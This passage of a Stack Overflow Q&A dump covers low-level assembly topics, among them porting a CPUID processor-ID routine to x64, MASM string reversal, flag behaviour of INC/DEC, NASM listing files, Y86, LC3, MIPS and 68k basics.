<p>My guess is that the instruction encoding for ""<strong>push $0x2</strong>"", <strong>6a02</strong>, is easier to modify in hexadecimal form. Both by hand and programmatically. I'd guess somebody somewhere tried to use CPUID function 3 to get the processor serial number and found that it wasn't supported then switched to using function 2.</p>

<p>The ""<strong>ret $0x10</strong>"" at the end is also unusual. The <strong>RET <em>IMM16</em></strong> form of the <strong>RET</strong> instruction returns to the caller then pops <strong><em>IMM16</em></strong> bytes off the stack. The fact that the callee is responsible for popping arguments off the stack after function return implies that this is not using the standard x86 calling convention.</p>

<p>Indeed, a quick peek into the C# code reveals that it's using <strong>CallWindowProc()</strong> to invoke the assembly function. The documentation for <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms633571%28v=vs.85%29.aspx"" rel=""noreferrer""><strong>CallWindowProc()</strong></a> shows that the assembly code is implementing a C function with a signature like:</p>

<pre><code>__stdcall CpuIdWindowProc(hWnd, Msg, wParam, lParam);
</code></pre>

<p><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#stdcall"" rel=""noreferrer""><strong>__stdcall</strong></a> is the special function calling convention used by 32 bit Windows APIs.</p>

<p>The assembly code uses <strong>0x10(%ebp)</strong>, which is the third argument to the function, as a character array to store the output from the <strong>CPUID</strong> instruction. (After a standard function prologue on x86, <strong>8(%ebp)</strong> is the first argument. <strong>0xc(%ebp)</strong> is the second 4-byte argument and <strong>0x10(%ebp)</strong> is the third) The third parameter in our window procedure function prototype above is <strong>wParam</strong>. It's used as an out parameter and is the only parameter used in the assembly code.</p>

<p>The last interesting thing about the assembly code is that it clobbers the registers <strong>EDI</strong> and <strong>EBX</strong> without saving them, violating the <strong>__stdcall</strong> calling convention. This bug is apparently latent when calling the function through <strong>CallWindowProc()</strong> but will reveal itself if you try to write your own main function in C to test the assembly code (<strong>cpuid-main.c</strong>):</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;

void __stdcall cpuid_wind_proc(uint32_t hWnd, uint32_t msg, uint8_t *wparam, uint32_t lparam);

enum {
    RESULT_SIZE = 2 * 4, /* Two 32-bit registers: EAX, EDX */
};

static unsigned int form_word_le(uint8_t a[])
{
    return (a[3] &lt;&lt; 24) | (a[2] &lt;&lt; 16) | (a[1] &lt;&lt; 8) | a[0];
}

int main()
{
    uint8_t r[RESULT_SIZE];
    memset(r, 0, sizeof(r));

    cpuid_wind_proc(0, 0, r, 0);

    printf(""%08x%08x\n"",  form_word_le(r + 4), form_word_le(r));
    return 0;
}
</code></pre>

<p>A version of the assembly fixed to save and restore <strong>EDI</strong>, <strong>EBX</strong> and use <strong>CPUID</strong> function 1 is like this:</p>

<pre><code>    .section .text
    .global _cpuid_wind_proc@16
_cpuid_wind_proc@16:
    push %ebp
    mov %esp, %ebp
    push %edi
    mov 16(%ebp), %edi
    push $1
    pop %eax
    push %ebx
    cpuid
    mov %eax, (%edi)
    mov %edx, 0x4(%edi)
    pop %ebx
    pop %edi
    mov %ebp, %esp
    pop %ebp
    ret $16
</code></pre>

<p>The symbol name <strong>_cpuid_wind_proc@16</strong> is how <strong>__stdcall</strong> function names are mangled on 32 bit Windows. The <strong>@16</strong> is the number of bytes the parameters take up. (Four parameters each taking four bytes on 32 bit Windows adds up to 16)</p>

<p>Now I'm ready to port the code to x64.</p>

<ul>
<li>By consulting <a href=""http://www.macieira.org/blog/2012/01/architectures-and-abis-detailed/"" rel=""noreferrer"">this handy ABI table</a> I see that the first four parameters are passed in <strong>RCX</strong>, <strong>RDX</strong>, <strong>R8</strong>, and <strong>R9</strong> so <strong>wParam</strong> is in <strong>R8</strong>.</li>
<li>The Intel documentation tells me that the <strong>CPUID</strong> instruction clobbers <strong>EAX</strong>, <strong>EBX</strong>, <strong>ECX</strong>, and <strong>EDX</strong>. <strong>EBX</strong> is the lower half of <strong>RBX</strong> which is a <strong>saved GPR</strong> in the ABI (""saved GPR"" here means a general purpose register that should retain its contents across a function call) so I made sure to save <strong>RBX</strong> before executing the <strong>CPUID</strong> instruction and restore <strong>RBX</strong> afterwards.</li>
</ul>

<p>Here's the x64 assembly:</p>

<pre><code>    .section .text
    .global cpuid_wind_proc
cpuid_wind_proc:
    push %rbx
    mov $1, %rax
    cpuid
    movl %eax, (%r8)
    movl %edx, 4(%r8)
    pop %rbx
    ret
</code></pre>

<p>As you can see the x64 version is shorter and easier to write. There's only one function calling convention on x64 so we don't have to worry about <strong>__stdcall</strong>.</p>

<p>Build the x64 assembly function along with <strong>cpuid-main.c</strong> and compare its output with this VBScript (<strong>cpuid.vbs</strong>):</p>

<pre><code>Set objProc = GetObject(""winmgmts:root\cimv2:Win32_Processor='cpu0'"")
WScript.echo objProc.ProcessorId
</code></pre>

<p>Run <strong>cpuid.vbs</strong> with</p>

<pre><code>wscript cpuid.vbs
</code></pre>

<p>and verify the outputs match. (I actually cross compiled with MinGW-w64 on Linux and ran the program under Wine64 emulation while doing the C and assembly work up till this point.)</p>

<p>With the x64 assembly CPUID function working, I'm now ready to integrate the code back into C#.</p>

<ul>
<li>Disassemble <strong>cpuid-x64.exe</strong> to get the opcodes and paste them as a new byte array (<strong>code_x64</strong>).</li>
<li>Change <strong>ExecuteCode()</strong> to determine whether to run the x86 or x64 version of the CPUID code by testing for <strong>IntPtr.Size == 8</strong> in <strong>IsX64Process()</strong>.</li>
</ul>

<p>Finally, change <strong>ProcessorId()</strong> to produce the hexadecimal string with:</p>

<pre><code>string.Format(""{0}{1}"", BitConverter.ToUInt32(sn, 4).ToString(""X8""), BitConverter.ToUInt32(sn, 0).ToString(""X8""));
</code></pre>

<p>Using <strong>""X8""</strong> instead of just <strong>""X""</strong> ensures that the UInt32 is formatted as an 8 digit hexadecimal value with zero padding. Otherwise, you can't tell which digits came from <strong>EDX</strong> and which from <strong>EAX</strong> when you concatenate them into a single string.</p>

<p>And that's it.</p>
","16487521"
"Assembly - Trying to reverse string, but it adds an extra character on the final string","6360","","<p>I'm rather new to Assembly (And programming in general, to be honest). I'm trying to play with the stack.
<strong>The purpose of this code:</strong></p>

<ul>
<li>Take in a String, limited to 80 characters</li>
<li>Reprint the String as entered</li>
<li>Print each character as it is pushed to the stack</li>
<li>Print each character as it is popped from the stack</li>
<li><em>Print the reversed String.</em></li>
</ul>

<p><strong>The code fails on the last step.</strong></p>

<p>If the entered String is ""Help"", it will print out ""pleHe"". The last character in the final String is the 2nd character of the original String.</p>

<p>Please help me see where I'm messing up at!</p>

<pre>.data
buffer WORD 81 DUP(0)
byteCount WORD ?
.code
main PROC
    call Clrscr                 ;Clear screen         
RS:
    mov edx, OFFSET buffer      ;Move String to edx
    mov cl, [SIZEOF buffer]-1   ;Set loop counter to (size of buffer) -1
    call ReadString             ;Read a User's String
    mov byteCount, ax           ;Move the size of User's String to byteCount
    cmp byteCount, 80           ;Compare byteCount with 80
    ja RS                       ;If byteCount is greater then 80, ask for another String
    call WriteString            ;Write User's String to screen
    call Crlf                   ;New Line
    call reverseIt              ;Reverse order of String
    exit

reverseIt PROC
    movzx ecx, byteCount        ;Set Loop1 Counter to size of String
    mov esi, 0                  ;Zero out ESI

L1:                             ;Loop1 - Pushes String into Stack one character at a time

    movzx eax, buffer[esi]      ;Dereference buffer and place in eax
    call Crlf                   ;New Line
    call WriteChar              ;Print current character to screen
    push eax                    ;Push current character to stack
    inc esi                     ;Move to next character
    loop L1

    call Crlf
    movzx ecx, byteCount        ;Set Loop2 Counter to size of String
    mov esi, 0                  ;Zero out ESI

L2:                             ;Loop2 - Pops Characters back into String in reverse order

    pop eax                     ;Retrieve character from top of stack
    call Crlf                   ;New Line
    call WriteChar              ;Print current character to screen
    mov buffer[esi], ax         ;Writes character to String
    inc esi                     ;Increase esi
    loop L2

    call Crlf                   ;New Line
    call Crlf                   ;New Line    
    mov edx, OFFSET buffer      ;Move String to edx for WriteString
    call WriteString            ;Prints String to Screen
    call Crlf                   ;New Line
    ret                         ;Return to main
    reverseIt ENDP
main ENDP
END main </pre>
","<p><strong>Problem</strong></p>

<p>You're treating your ASCII characters as WORDs rather than bytes, so you end up reversing two characters at a time:</p>

<p>When you reverse the string two characters at a time, you end up writing these values to the buffer:</p>

<pre><code>esi+0: p-
esi+1: lp
esi+2: el
esi+3: He
</code></pre>

<p>During each iteration your buffer looks like this:</p>

<pre><code>Help--
p-lp--
plpp--
plel--
pleHe-
</code></pre>

<p>So you end up writing that extra e to the buffer. I assume the e doesn't show up in your WriteChar loop.</p>

<p><strong>Solution</strong></p>

<p>I haven't tested your code so can't know for sure, but it looks like you need to change this line:</p>

<pre><code>mov buffer[esi], ax         ;Writes character to String
</code></pre>

<p>to </p>

<pre><code>mov ptr byte buffer[esi], al         ;Writes character to String
</code></pre>

<p>It's probably a good idea to change this line too:</p>

<pre><code>buffer WORD 81 DUP(0)
</code></pre>

<p>so it uses BYTEs instead:</p>

<pre><code>buffer BYTE 81 DUP(0)
</code></pre>
","2309451"
"why the INC and DEC instructions do not affect the carry flag?","6344","","<p>Why do the x86 instruction <code>INC</code> (increment) and <code>DEC</code> (decrement) not affect the <code>CF</code> (carry flag) in FLAGSREGISTER?</p>
","<p>To understand why you probably need to remember the current ""x86"" CPUs with 32 and 64 bit values started life as much more limited 8-bit machines, going back to the Intel 8008.  (I coded in this world back in 1973, I still remember (ugh) it!).</p>

<p>In that world, registers were precious and small.   You need inc/dec for various purposes, the most common being loop control.  Many loops involved doing ""multi-precision arithmetic"" (e.g, 16 bits or more!) By having inc/dec set the Z bit, you could use them to control loops pretty nicely; by insisting the loop control instructions not change the carry bit, the carry is preserved across loop iterations and you can implement multiprecision operations without writing tons of code to remember the carry state.</p>

<p>This worked pretty well, once you got used to the ugly instruction set.</p>

<p>On more modern machines with larger word sizes, you don't need this is much, so INC and DEC could be semantically equivalent to ADD ...,1 etc.   That in fact is what I use when I need the carry set :-}   </p>

<p>Mostly, I stay away from INC and DEC now, because they do partial condition code updates, and this can cause funny stalls in the pipeline, and ADD/SUB don't.  So where it doesn't matter (most places), I use ADD/SUB to avoid the stalls.  I use INC/DEC only when keeping the code small matters, e.g., fitting in a cache line where the size of one or two instructions makes enough difference to matter.  This is probably pointless nano[literally!]-optimization, but I'm pretty old-school in my coding habits.</p>

<p>My explanation tells us why INC/DEC set the zero bit.  I don't have a particularly
compelling explanation for why INC/DEC set the sign (and the parity? bits).</p>

<p>EDIT April 2016: It seems that the stall problem is handled better on modern x86s.
See <a href=""https://stackoverflow.com/q/36510095/120163"">INC instruction vs ADD 1: Does it matter?</a></p>
","13435633"
"Basic for-loop in 68k assembly?","6338","","<p>I'm attempting to write a program which requires the use of a for-loop, among other things. 
I am having a terrible time trying to find examples of basic code such as this on other websites.</p>

<p>If someone could please provide me with a simple for loop, or even the instructions I should be looking at I would be greatful. And please, if you know of a good resource for 68k beginner tutorials, comment below!</p>

<p>Thanks!</p>
","<p>See <a href=""http://www.virtualdub.org/blog/pivot/entry.php?id=84"" rel=""nofollow"">here</a> for an answer to your query (3rd result in google search '68000 assembly')</p>

<p>[edit] <br></p>

<p><strong>add answer from link <br></strong></p>

<p>The 68000 has the rare (unique?) characteristic of having separate address and data registers. There are eight data registers, D0-D7, and eight address registers, A0-A7. A7 is also the stack pointer, SP. This means that 68000 assembly language tends to be easier to follow because you can easily tell which registers hold data and which hold addresses. For example, this is 68000 assembly to compute the sum of an array of words:</p>

<pre><code>    moveq #0, d0
    moveq #0, d1
    moveq #5, d2
loop:
    move.w (a0)+, d0
    add.l d0, d1
    dbra d2, loop
</code></pre>

<p>[/edit]</p>
","4217944"
"Y86 code doesn't handle ret instruction as expected","6337","","<p>The following is a homework problem for an assembly language class.  We're to create Y86 code by reading X86 code generated from C in gdb.  The purpose of the function is to sum the elements of a linked list.</p>

<p>As the function currently stands, it works!   The correct value is contained in the %eax register when the program terminates.  Unfortunately, it is only correct due to a hack.  I added a <code>halt</code> instruction right at the end of the function, right before the <code>ret</code> instruction.  If I uncomment that, what appears to happen is that when it carries out the <code>ret</code> instruction, the PC is set to 0x0.  In other words, it seems to start over at the beginning, when what it <em>should</em> do is return to the point where it was called.  It enters an infinite loop.</p>

<p>The code follows.  It is standalone, if you have the Y86 simulator installed.</p>

<pre><code>.pos    0
init:    irmovl Stack, %esp  
irmovl    Stack, %ebp  
jmp     Main  

Main:  
    irmovl  ele1, %eax  
    pushl   %eax  
    call    sum_list  
    halt  

sum_list:  
    pushl   %ebp  
    rrmovl  %esp, %ebp  
    irmovl  $16, %edx  
    subl    %edx, %esp  
    irmovl  $0, %edx  
    rmmovl  %edx, -4(%ebp)  
    jmp     L2  

L3:
    mrmovl  8(%ebp), %eax
    mrmovl  (%eax), %eax
    mrmovl  -4(%ebp), %edx
    addl    %eax, %edx
    rmmovl  %edx, -4(%ebp)
    mrmovl  8(%ebp), %eax
    mrmovl  4(%eax), %eax
    rmmovl  %eax, 8(%ebp)

L2:
    irmovl  $0, %ecx
    mrmovl  8(%ebp), %edx
    subl    %ecx, %edx
    jne     L3
    mrmovl  -4(%ebp), %eax
    rrmovl  %esp, %ebp
    popl    %ebp
    halt #THIS DOESN'T BELONG. COMMENT OUT TO SEE BAD BEHAVIOR.
    ret

#linked list
.align  4
    ele1:
            .long   0x00a
            .long   ele2
    ele2:
            .long   0x0b0
            .long   ele3
    ele3:
            .long   0xc00
            .long   0


    .pos    0x300
    Stack:
</code></pre>

<p>Thanks for your help!  </p>
","<p>This may or may not be the cause of the error, but I think you are tearing down the stack frame of <code>sum_list</code> incorrectly. You set it up as follows:</p>

<pre><code>pushl   %ebp  
rrmovl  %esp, %ebp
</code></pre>

<p>but then you tear it down like this:</p>

<pre><code>rrmovl  %esp, %ebp
popl    %ebp
</code></pre>

<p>Notice that you copy from <code>%esp</code> to <code>%ebp</code> in both cases, which is not correct since the teardown is supposed to undo what the setup does. Instead, try</p>

<pre><code>rrmovl  %ebp, %esp
popl    %ebp
</code></pre>

<p>or simply</p>

<pre><code>leave
</code></pre>

<p>which does the same thing.</p>
","5995284"
"How to read a NASM Assembly program .lst listing file","6336","","<p>I wrote a NASM program and created a listing file from it using <code>nasm -f elf -l rs.lst rs.asm</code>.
The program, which works perfectly, takes in a key input value, and outputs whether the value is a control key or printable key, and if it is a number, lowercase, or uppercase letter.</p>

<p>I need help understanding what I am reading in the .lst file. 
Are the numbers on the left addresses? Instructions? DO they represent memory? 
Here's the <code>.lst</code>. </p>

<pre><code>     1                                  segment .data
        //Removed my student ID info                            
     8                                      ;Program Output Strings
     9                                  
    10 00000023 5072657373204B6579-         askForKey: db 'Press Key and Enter: ', 10   ; ;10 is the newline value
    11 0000002C 20616E6420456E7465-
    12 00000035 723A200A           
    13                                      askLen: equ $-askForKey
    14                                  
    15 00000039 436F6E74726F6C204B-         controlKey: db 'Control Key ', 10
    16 00000042 6579200A           
    17                                      controlLen: equ $-controlKey
    18                                      
    19 00000046 5072696E7461626C65-         printableKey: db 'Printable Key ', 10   
    20 0000004F 204B6579200A       
    21                                      printableLen: equ $-printableKey
    22                                  
    23 00000055 446563696D616C204B-         decimalKey: db 'Decimal Key ', 10
    24 0000005E 6579200A           
    25                                      decimalLen: equ $-decimalKey
    26                                  
    27 00000062 55707065722D636173-         upperKey: db 'Upper-case Key ', 10
    28 0000006B 65204B6579200A     
    29                                      upperLen: equ $-upperKey
    30                                  
    31 00000072 4C6F7765722D636173-         lowerKey: db 'Lower-case Key ', 10
    32 0000007B 65204B6579200A     
    33                                      lowerLen: equ $-lowerKey
    34                                      
    35 00000082 0A                          blankLine: db '', 10
    36                                      blankLen: equ $-blankLine
    37                                   
    38                                  segment .bss
    39                                  
    40 00000000 &lt;res 00000002&gt;              key resb 2
    41                                  
    42                                  segment .text
    43                                  
    44                                      global main
    45                                  main:
    46                                  
    47                                  
    48 00000000 B804000000                  mov eax, 4      ; system call 4
    49 00000005 BB01000000                  mov ebx, 1      ; standard output 
    50 0000000A B9[00000000]                mov ecx, studentInfo    ; 'Program by Raphael Stein'
    51 0000000F BA23000000                  mov edx, infoLen
    52 00000014 CD80                        int 0x80
    53                                      
    54                                      ;Program Begins
    55                                  
    56                                      ; Ask for key input
    57 00000016 B804000000                  mov eax, 4      ; system call 4
    58 0000001B BB01000000                  mov ebx, 1      ; standard output 
    59 00000020 B9[23000000]                mov ecx, askForKey  ; 'Press key and Enter: '
    60 00000025 BA16000000                  mov edx, askLen 
    61 0000002A CD80                        int 0x80
    62                                      ; Take input
    63 0000002C B803000000                  mov eax, 3  ; system call 3 to get input
    64 00000031 BB00000000                  mov ebx, 0  ; standart input device
    65 00000036 B9[00000000]                mov ecx, key    ; pointer to id
    66 0000003B BA02000000                  mov edx, 2  ; take in this many bytes
    67 00000040 CD80                        int 0x80    
    68                                  
    69                                  
    70                                      
    71                                  control:        ; check if it's a control key
    72 00000042 B120                        mov cl, 32  ; space bar (32) is the first key after control keys
    73 00000044 BB[00000000]                mov ebx, key    ;move the first 8bits of ebx for comparison
    74 00000049 380B                        cmp byte [ebx], cl  ; compare 32 and the value of key 
    75 0000004B 7D1B                        jge printable   ; If the key is &gt;=, it's a printable
    76 0000004D B804000000                  mov eax, 4
    77 00000052 BB01000000                  mov ebx, 1
    78 00000057 B9[39000000]                mov ecx, controlKey
    79 0000005C BA0D000000                  mov edx, controlLen
    80 00000061 CD80                        int 0x80
    81 00000063 E9A0000000                  jmp exit    ; It's obviously not any of the other categories
    82                                  
    83                                      
    84                                  printable:  ; Tell that it's a printable symbol
    85 00000068 B804000000                  mov eax, 4
    86 0000006D BB01000000                  mov ebx, 1
    87 00000072 B9[46000000]                mov ecx, printableKey
    88 00000077 BA0F000000                  mov edx, printableLen
    89 0000007C CD80                        int 0x80
    90                                  
    91                                  decimal: 
    92 0000007E B130                        mov cl, 48  ; 0 (48) is the smallest decimal
    93 00000080 BB[00000000]                mov ebx, key    ;move the first 8bits of ebx for comparison
    94 00000085 380B                        cmp byte [ebx], cl
    95 00000087 7C7F                        jl  exit
    96 00000089 B139                        mov cl, 57  ; 9 (57) is the largest decimal
    97 0000008B BB[00000000]                mov ebx, key    ;move the first 8bits of ebx for comparison
    98 00000090 380B                        cmp byte [ebx], cl
    99 00000092 7F18                        jg  uppercase   ; if key is greater, jump to check if it's                      uppercase.
   100 00000094 B804000000                  mov eax, 4
   101 00000099 BB01000000                  mov ebx, 1
   102 0000009E B9[55000000]                mov ecx, decimalKey
   103 000000A3 BA0D000000                  mov edx, decimalLen
   104 000000A8 CD80                        int 0x80
   105 000000AA EB5C                        jmp exit
   106                                  
   107                                  uppercase:
   108 000000AC B141                        mov cl, 65  ; A (65) is the smallest smallest uppercase
   109 000000AE BB[00000000]                mov ebx, key    ;move the first 8bits of ebx for comparison
   110 000000B3 380B                        cmp byte [ebx], cl
   111 000000B5 7C51                        jl  exit
   112 000000B7 B15A                        mov cl, 90  ; Z (90) is the largest upper case
   113 000000B9 BB[00000000]                mov ebx, key    ;move the first 8bits of ebx for comparison
   114 000000BE 380B                        cmp byte [ebx], cl
   115 000000C0 7F18                        jg  lowercase
   116 000000C2 B804000000                  mov eax, 4  ; If it IS an upper case key, print and then exit
   117 000000C7 BB01000000                  mov ebx, 1
   118 000000CC B9[62000000]                mov ecx, upperKey
   119 000000D1 BA10000000                  mov edx, upperLen
   120 000000D6 CD80                        int 0x80
   121 000000D8 EB2E                        jmp exit
   122                                  
   123                                          
   124                                  lowercase:
   125 000000DA B161                        mov cl, 97  ; a (97) is the smallest smallest uppercase
   126 000000DC BB[00000000]                mov ebx, key    ;move the first 8bits of ebx for comparison
   127 000000E1 380B                        cmp byte [ebx], cl
   128 000000E3 7C23                        jl  exit    ; If the key is less than 97 exit.
   129 000000E5 B17A                        mov cl, 122 ; Z (90) is the largest upper case
   130 000000E7 BB[00000000]                mov ebx, key    ;move the first 8bits of ebx for comparison
   131 000000EC 380B                        cmp byte [ebx], cl
   132 000000EE 7FEA                        jg  lowercase
   133 000000F0 B804000000                  mov eax, 4  ; If it IS an upper case key, print and then exit
   134 000000F5 BB01000000                  mov ebx, 1
   135 000000FA B9[72000000]                mov ecx, lowerKey
   136 000000FF BA10000000                  mov edx, lowerLen
   137 00000104 CD80                        int 0x80
   138 00000106 EB00                        jmp exit
   139                                      
   140                                  exit:
   141 00000108 B804000000                  mov eax, 4      ; system call 4
   142 0000010D BB01000000                  mov ebx, 1      ; standard output 
   143 00000112 B9[82000000]                mov ecx, blankLine  ; Print blank line before exiting
   144 00000117 BA01000000                  mov edx, blankLen
   145 0000011C CD80                        int 0x80
   146                                  
   147 0000011E B801000000                  mov eax, 1
   148 00000123 31DB                        xor ebx, ebx
   149 00000125 CD80                        int 0x80
   150                                  
</code></pre>
","<p>The numbers on the left are the binary output of the assembler, related to your source code lines.</p>

<p>First column is source code line </p>

<p>The second column is address or offset. For example <code>00000023</code> is the address where your prompt label <code>askForKey:</code> is.</p>

<p>Third column is binary value. For example if you look at your prompt text <code>Press</code> it translates directly to hex values <code>5072657373</code></p>

<p><code>52 00000014 CD80                        int 0x80</code> </p>

<p>reads like this:</p>

<p>source code line 52, offset 00000014 contains binary value CD80, compiled from instruction INT 0x80. </p>

<p>You can also see that the next line that has an address next to it is <code>57 00000016</code>, where the 16 came to be from the 14 before + 2 bytes for CD80</p>
","16155066"
"How can I get started on writing my own mobile OS for ARM processors?","6331","","<p>I am interested in creating my own mobile OS. I read that the existing mobile OSes run on ARM processors and use their assembly language, while desktop OSes like Linux and Windows are written in asm. C appears to be a language common to both. This leads me to some questions:</p>

<ul>
<li>Do I have to learn ARM assembly language if I want to build my own mobile OS targeting the ARM Cortex processor?</li>
</ul>

<p>If so, then once I start doing it:</p>

<ul>
<li>Where/how do I test it? Can it run in a virtual machine?</li>
<li>There are boards like Beagleboard, but I don't understand why I'd need to buy them if I can use a VM - am I missing something here?</li>
<li>Can a single OS run on both x86 and ARM?</li>
</ul>

<p>I'm sure that I want to build a mobile OS which can run on ARM processors like most of the existing mobile OSes do.</p>

<ul>
<li>What should my initial steps be? Will it help to look at open source projects like android or any other OS?</li>
<li>Where can I find ARM assembly language resources and IDEs?</li>
</ul>
","<p>1) some assembly is required for all platforms, you probably need some startup code to cover the assumptions of the programming language, for example a C compiler assumes you have setup the stack (pointer), and zeroed out .bss memory, .data is in the right place, etc.  Depending on the processor, but usually, you may need some code for interrupt handling, and maybe task switching, etc.</p>

<p>2) yes there are many virtual machines, qemu, skyeye, etc.  I have one derived from the amber project on opencores <a href=""http://github.com/dwelch67/amber_samples"" rel=""nofollow noreferrer"">http://github.com/dwelch67/amber_samples</a></p>

<p>3) it is very rare that an instruction set simulator or virtual machine, etc exactly matches the processor.  Just because it works on the vm/sim doesnt mean it works.  No different than running code in a debugger and outside a debugger.   You should try different simulators as well as hardware to verify the quality of the simulator.  One arm processor to another or one x86 to another can vary enough to lead to your software failing so even running on hardware isnt enough to sort out all of your potential bugs.</p>

<p>4) linux runs on many platforms yes?  Netbsd runs on even more, yes?  Depending on how you design your program it can be very portable or not portable or anywhere in between.  It is up to you.</p>

<p>5) You need some operating system basics. maybe get the MicroC/OS-II book or some other similar materials.  Get through the basics of task switching, etc.</p>

<p>6) IDE's and editors, etc are a very personal thing, one persons favorite is loathed by others.  For ARM development you need to get the ARM ARM (ARM Architectural Reference Manual).  What used to be a single document has split due to them having so many different cores and families.  What is the oldest looking one the ARMv5 or ARMv6 ARM is what used to be the singular one.  Get that one and you can at least write code that is more portable across the whole family of arm cores.  You will want to get some TRM's (Technical Reference Manuals).  Get the one for the ARM7TDMI (ARMv4T), its like getting the 486 manual from intel, pretty much everything (32bit arm instructions) since is compatible back to that core.  Probably want to get TRM's for other families.  Understand that even though an older version for example a rev 1.0 (r1p0) might be marked as obsolete if there is a manual for it ARM has sold it to someone and it exists in some chips somewhere, and you might need to know the differences between cores (if you target that closely).    Peripherals such as the pl310 L2 cache are often found attached to some cores, you will likely want to know what is in there if you have an interest in turning on and using the cache.   Hmmm, the arm7 (ARMv4, not to be confused with the ARMv7) does not have an mmu, I think the ARM9 does, so depending  on how you want to manage apps and their memory, you might want to use the ARM9 or something newer as a baseline.</p>

<p>get the codesourcery lite gnu based toolchain.  codesourcery is now part of mentor graphics.  It is not hard to build your own cross compiler for arm or get some other (emdebian, etc).  ARM makes a good compiler but it is pricey and most support will come from them at a price, certainly some online googling for help but most free help is gcc based.  the llvm compiler tools are getting better every day, they are used on iPhones from what I understand.  I use the clang compiler which is part of llvm.  You dont have to build a cross compiler necessarily out of the box they are a cross compiler from language to intermediate to target's assembly.  assembling and linking is targeted to the host, but you can use the gnu binutils assembler and linker for that final step.</p>

<p>Like the IDE/editor, your programming style and preferences might lean you toward one compile environment over another.</p>

<p>You might find my arm examples on github useful or not, they are low level, board bring up type examples.  Mostly thumb based but some arm as well where possible.</p>
","9956694"
"Best way to move float to new register in mips?","6300","","<p>What is the best way to move a floating value from one register to another?</p>

<p>If I was working with integer and wanted to move the contents of $t0 to $t1 I would simply do </p>

<pre><code>add  $t1, $t0, $zero
</code></pre>

<p>If I want to do the same thing with 
floting numbers I'm currently doing it like this</p>

<pre><code>sub.s  $f1, $f0, $f0
add.s  $f1, $f0, $f1
</code></pre>

<p>Is there any better way to do this? And if someone knows there to find a good referencecard for mips WITH the floating point instructions pleas tell me.</p>
","<p>There's a register-register move instruction for this:</p>

<pre><code>mov.s $f1, $f0
</code></pre>
","10383241"
"Disassembly in Visual Studio 2012 Ultimate","6290","","<p>I'd like to check the generated assembly code of the compiler optimized parts (release) of my C++ code in Visual Studio 2012 Ultimate.
There are articles on the web about a Disassembly window, but I can't access it.</p>
","<p>In the property page of the cpp file containing the function you desire inspect the disassembly, go to the ""Output files"" category and you can enable an assembly dump to a provided filename.</p>
","18431204"
"carry flag and subtraction issue","6287","","<p>If a large number is subtracted from a smaller number then borrow is needed. The carry flag plays the role of borrow during the subtraction operation.
Now suppose we want to subtract  66 from 56, obviously the borrow is needed and carry flag will be set. Now how this subtraction is performed to get the result -10, how computer will distinguish that the result is going to be a negative number. Please explain the process.</p>
","<p>Normally, subtraction is implemented as a negate, then add. So for your example, the CPU would internally take 56 and add -66. On an x86 (or most other modern processors) the negate will be done with two's complement, which means negate translates to ""complement all the bits, then add one (and ignore any carry out).""</p>

<pre><code>    0011 1000
-   0100 0010
    ---------
</code></pre>

<p>The second operand is transformed as follows:</p>

<pre><code>complement bits: 1011 1101
Increment:       1011 1110
</code></pre>

<p>So the operation that's carried out is:</p>

<pre><code>    0011 1000
+   1011 1110
--------------
=   1111 0110
</code></pre>

<p>This result can be viewed as either 246 (as an unsigned number) or -10 (as a signed number).</p>
","2851597"
"LC3 LEA instruction and the value stored","6279","","<p>I am confused by this question: What is the value stored in register 0 after instruction <code>“LEA R0,A""</code> is executed? How come the answer is x370C ? I reckon it is supposed to load the address of A into R0? If so how do we know the address?  Can someone please help? Many thanks! </p>

<pre><code>.ORIG X3700
 LEA R0, A
 LDI R2, C LDR R3, R0, 2 
 AND R1, R1, #0 
 IN
 ST R0, D 
 JSR  F 
 HALT
F LD  R1, B
 ADD R1, R1, #1
 BRp F 
 RET

 A .FILL X1234
 B .FILL X370B
 C .FILL X370C
 D .BLKW 2
 E .STRINGZ ""ABCD""
 G .FILL X1234
 .END
</code></pre>
","<p>The origin of the code is <code>x3700</code>, and you have 12 instructions, so the address of <code>A</code> will be <code>x3700 + x0C = x370C</code>. As you guessed, <code>LEA R0,A</code> loads the address of <code>A</code> into <code>R0</code>, so <code>R0</code> will contain <code>x370C</code> after that first instruction has been executed.</p>

<pre><code>        .ORIG X3700
3700     LEA R0, A
3701     LDI R2, C
3702     LDR R3, R0, 2 
         ...
370b     RET

370c     A .FILL X1234
         ...
</code></pre>
","25866748"
"push on 64bit intel osx","6277","","<p>I want to push 64 bit address on stack as below,</p>

<pre><code>__asm(""pushq $0x1122334455667788"");
</code></pre>

<p>But I get compilation error and I can only push in following way,</p>

<pre><code>__asm(""pushq $0x11223344"");
</code></pre>

<p>Can someone help me understand my mistake?</p>

<p>I am new to assembly, so please excuse me if my question sounds stupid.</p>
","<p>x86-64 has some interesting quirks, which aren't obvious even if you're familiar with 32-bit x86...</p>

<ol>
<li><p>Most instructions can only take a 32-bit immediate value, which is sign-extended to 64 bits if used in a 64-bit context.  (The instruction encoding stores only 32 bits.)</p>

<p>This means that you can use <code>pushq</code> for immedate values in the range <code>0x0</code> - <code>0x7fffffff</code> (i.e. positive signed 32-bit values which are sign-extended with 0 bits) or <code>0xffffffff80000000</code> - <code>0xffffffffffffffff</code>) (i.e. negative signed 32-bit values which are sign-extended with 1 bits).  But you cannot use values outside this range (as they cannot be represented in the instruction encoding).</p></li>
<li><p><code>mov</code> is a special case: there is an encoding which takes a full 64-bit immediate operand.  Hence Daniel's answer (which is probably your best bet).</p></li>
<li><p>If you <em>really</em> don't want to corrupt a register, you could use multiple pushes of smaller values.  However, the obvious thing of pushing two 32-bit values won't work.  In the 64-bit world, <code>push</code> will work with a 64 bit operand (subject to point 1 above, if it's an immediate constant), or a 16 bit operand, but not a 32 bit operand (even <code>pushl %eax</code> is not valid).  So the best you can do is 4 16-bit pushes:</p>

<p><code>pushw $0x1122; pushw $0x3344; pushw $0x5566; pushw $0x7788</code></p></li>
</ol>
","13354007"
"How to end assembly correctly?","6264","","<p>I have a problem correctly terminating a 16bit DOS program written in Assembly.  Here's part of code:</p>

<pre><code>.386P
.model flat

stack_s segment stack 'stack' 
        db 256 dup(0)
stack_s ends

data segment use16
data ends

code segment 'code' use16
assume cs:code, ds:data

main proc
    mov ax, data
    mov ds, ax

    iretd
main endp

code ends
end main
</code></pre>

